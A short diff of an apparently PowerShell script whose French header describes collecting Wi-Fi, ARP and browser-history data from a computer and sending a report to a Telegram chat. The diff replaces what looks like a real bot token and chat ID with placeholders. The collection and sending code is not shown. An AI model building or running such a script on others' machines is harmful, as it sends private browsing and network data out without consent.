@@ -2,8 +2,8 @@
 # Audit + Wi-Fi + ARP + Historique navigateur + Envoi Telegram
 # Ne modifie RIEN
 
-$token = "8443847149:AAFgosy6aRz10YIogxCmOW1sni8_lUhlrHo"
-$chatid = "8527075753"
+$token = "TOKEN_ID"
+$chatid = "CHAT_ID"
 $reportPath = "$env:TEMP\audit_report.html"
 $user = $env:USERNAME
 $pc = $env:COMPUTERNAME
